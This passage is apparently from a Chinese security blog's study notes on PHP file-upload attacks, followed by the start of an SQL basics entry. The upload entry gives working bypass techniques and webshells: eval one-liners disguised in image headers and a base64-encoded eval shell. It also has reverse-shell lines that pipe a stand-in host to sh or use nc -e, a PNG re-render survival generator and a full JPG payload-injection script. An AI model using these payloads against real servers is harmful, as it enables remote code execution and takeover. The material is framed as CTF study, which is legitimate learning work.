class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="文件上传的成因"><a href="#文件上传的成因" class="headerlink" title="文件上传的成因"></a>文件上传的成因</h4><p>由于历史原因，早期服务器比较贵，用户上传的文件只能存放在web目录</p>
<h3 id="0x3-文件上传可能存在的漏洞"><a href="#0x3-文件上传可能存在的漏洞" class="headerlink" title="0x3 文件上传可能存在的漏洞"></a>0x3 文件上传可能存在的漏洞</h3><p>文件上传本质就是对服务器文件系统写操作，就有可能执行我们写入的恶意代码</p>
<h4 id="文件上传后缀黑名单过滤"><a href="#文件上传后缀黑名单过滤" class="headerlink" title="文件上传后缀黑名单过滤"></a>文件上传后缀黑名单过滤</h4><p>某些配置文件为了兼容老版本的php代码，也会解析php3，php5，phtml</p>
<h4 id="php文件上传的00截断"><a href="#php文件上传的00截断" class="headerlink" title="php文件上传的00截断"></a>php文件上传的00截断</h4><p>123.php%00.jpg保存时.jpg会被截断舍弃，但是只有PHP版本小于5.3.4才存在此漏洞</p>
<h4 id="iconv字符转换异常造成截断"><a href="#iconv字符转换异常造成截断" class="headerlink" title="iconv字符转换异常造成截断"></a>iconv字符转换异常造成截断</h4><p>5.4以上版本已经修复</p>
<h4 id="文件后缀白名单过滤"><a href="#文件后缀白名单过滤" class="headerlink" title="文件后缀白名单过滤"></a>文件后缀白名单过滤</h4><h5 id="web服务器解析漏洞"><a href="#web服务器解析漏洞" class="headerlink" title="web服务器解析漏洞"></a>web服务器解析漏洞</h5><h6 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h6><p>Windows系统下一般使用ISS作为web服务器，比较老版本会解析目录名字为xxx.asp等字符构成的目录。</p>
<h6 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h6><p>nginx配置错误</p>
<p>nginx会将后缀为123.txt/123.php的uri请求匹配到，误认为是php后缀</p>
<h6 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h6><p>如果上传1.php被禁止，可以上传1.php.charmersix ，charmersix后缀不识别，就会继续往前识别后缀。</p>
<h3 id="0x4文件上传高级利用"><a href="#0x4文件上传高级利用" class="headerlink" title="0x4文件上传高级利用"></a>0x4文件上传高级利用</h3><h4 id="配置文件绕过"><a href="#配置文件绕过" class="headerlink" title="配置文件绕过"></a>配置文件绕过</h4><h5 id="htaccess配置文件"><a href="#htaccess配置文件" class="headerlink" title=".htaccess配置文件"></a>.htaccess配置文件</h5><h5 id="user-ini配置文件"><a href="#user-ini配置文件" class="headerlink" title=".user.ini配置文件"></a>.user.ini配置文件</h5><p><code>auto_append_file=1.txt</code></p>
<p>使用auto_append_file参数来包含进行当前的php文件一起执行。</p>
<p>.user.ini自动附加文件时，当前目录必须要有php文件</p>
<p>配置文件必须要有php文件才能生效</p>
<p>直接访问首页，即可执行一句话木马</p>
<h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><p>像<code>&lt;?php , system , eval , $_GET, $_POST</code>如果这些函数被禁用，即文件中带有这些函数的文件都无法上传，我们可以使用cookie传输数据，或者用nc反弹shell</p>
<p>1.用cookie传输数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_COOKIE</span>[<span class="number">1</span>]`;</span><br></pre></td></tr></table></figure>

<p>`文件上传，然后cookie传输</p>
<p><code>echo &quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b&quot;|base64 -d&gt;1.php</code></p>
<p>再连接1.php</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209112109336.png" alt="image-20220911210914228"></p>
<p>2.反弹shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> `nc ip port -e /bin/sh`;</span><br><span class="line"><span class="meta">&lt;?=</span> `curl curl https:<span class="comment">//your-shell.com/ip:port |sh`;</span></span><br></pre></td></tr></table></figure>

<p>3.使用php伪协议，文件包含</p>
<p><code>auto_append_file=php://input</code></p>
<p>4.日志包含</p>
<p><code>auto_append_file=/var/log/nginx/access.log</code></p>
<p>注意.user.ini内容的文件名</p>
<h4 id="文件上传与XSS"><a href="#文件上传与XSS" class="headerlink" title="文件上传与XSS"></a>文件上传与XSS</h4><h4 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传"></a>图片上传</h4><h5 id="getimagesize绕过"><a href="#getimagesize绕过" class="headerlink" title="getimagesize绕过"></a>getimagesize绕过</h5><p>扫描图片中是否存在高宽，如果存在就认为正常</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define height 100</span></span><br><span class="line"><span class="comment">#define width 100</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="png二次渲染绕过"><a href="#png二次渲染绕过" class="headerlink" title="png二次渲染绕过"></a>png二次渲染绕过</h5><p>直接生成一个新图片，清洗掉原来的恶意代码</p>
<p>这里我们用脚本写一个恶意代码不会被清洗的图片</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="jpg二次渲染绕过"><a href="#jpg二次渲染绕过" class="headerlink" title="jpg二次渲染绕过"></a>jpg二次渲染绕过</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">用法  php exp.php a.png</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们来一个jpg二次渲染绕过的专用图片</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209271146879.jpg" alt="jpg_xr" style="zoom:33%;" />

<h4 id="配合文件包含"><a href="#配合文件包含" class="headerlink" title="配合文件包含"></a>配合文件包含</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209112211613.png" alt="image-20220911221130575"></p>
<ul>
<li>文件上传最容易出现代码执行和命令执行，且危害巨大</li>
<li>配置文件.user.ini中，auto_append_file参数不仅可以写文件名，也可以是伪协议和nginx日志</li>
<li>getimagesize函数可以通过#define width 100来绕过</li>
<li>png和jpg二次渲染后，仍可能保留恶意代码</li>
</ul>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>PHP_upload</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_5_SQL注入</title>
    <url>/2022/10/01/web_5/</url>
    <content><![CDATA[<h2 id="第一节-SQL基础"><a href="#第一节-SQL基础" class="headerlink" title="第一节 SQL基础"></a>第一节 SQL基础</h2><h3 id="0x1-sql基本语法"><a href="#0x1-sql基本语法" class="headerlink" title="0x1 sql基本语法"></a>0x1 sql基本语法</h3><h4 id="sql作用"><a href="#sql作用" class="headerlink" title="sql作用"></a>sql作用</h4><p>curd 通过sql语句，和数据库交互，实现增删改查操作</p>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>是一种软件，将数据以一定的格式保存在磁盘中，方便人们进行数据操作</p>
<p>数据库一般分为</p>
<ul>
<li>关系型数据库</li>
<li>非关系型数据库</li>
</ul>
<h5 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h5><p>采用了关系模型组织数据的数据库</p>
<p>二维模型可以简单理解为二维表格模型</p>
<p>常见的代表软件有：</p>
<ul>
<li><p>Oracle</p>
</li>
<li><p>MySQL</p>
<p>Maria DB 作为MySQL开源版本使用</p>
</li>
<li><p>SQL server</p>
<p>微软数据库软件，win中广泛使用</p>
</li>
<li><p>access</p>
<p>office产品数据库，后缀一般为mdb</p>
</li>
</ul>
<h5 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h5><p>也叫Nosql，泛指非关系型数据库</p>
<p>为了解决大规模数据集合多重数据种类带来的挑战，特别是大数据应用难题</p>
<p>典型代表</p>
<ul>
<li>Membase</li>
<li>MongoDB</li>
</ul>
<h4 id="数据库与SQL"><a href="#数据库与SQL" class="headerlink" title="数据库与SQL"></a>数据库与SQL</h4><h5 id="本地数据库"><a href="#本地数据库" class="headerlink" title="本地数据库"></a>本地数据库</h5><p>这里我们使用PHP study里面的MySQL，点击启动</p>
<h5 id="使用navicat建立数据库和数据表"><a href="#使用navicat建立数据库和数据表" class="headerlink" title="使用navicat建立数据库和数据表"></a>使用navicat建立数据库和数据表</h5><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210091402231.png" alt="image-20221009140249121"></p>
<p>我们在创建数据表时,可以将id设为键,然后递增</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210122143466.png" alt="image-20221012214332333"></p>
<p>这时候我们双击表格名字，就能看到它里面的数据，这些数据其实是软件帮我们执行了SQL语句后拿到的返回值填充到了可视化表格中</p>
<h5 id="使用SQL语句查询数据"><a href="#使用SQL语句查询数据" class="headerlink" title="使用SQL语句查询数据"></a>使用SQL语句查询数据</h5><p>打开命令行界面，执行我们第一个SQL语句</p>
<p><code>select id,username,password from user;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210091411626.png" alt="image-20221009141108536"></p>
<h3 id="0x2-php操作数据库"><a href="#0x2-php操作数据库" class="headerlink" title="0x2 php操作数据库"></a>0x2 php操作数据库</h3><h4 id="php连接MySQL数据库"><a href="#php连接MySQL数据库" class="headerlink" title="php连接MySQL数据库"></a>php连接MySQL数据库</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="string">&quot;blog&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="string">&quot;3306&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$db</span>,<span class="variable">$port</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;数据库连接异常&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候我们访问<code>127.0.0.1/conn.php</code>.发现连接成功</p>
<h4 id="使用php建立登录界面"><a href="#使用php建立登录界面" class="headerlink" title="使用php建立登录界面"></a>使用php建立登录界面</h4><p>首先我们写一个登陆的前端页面</p>
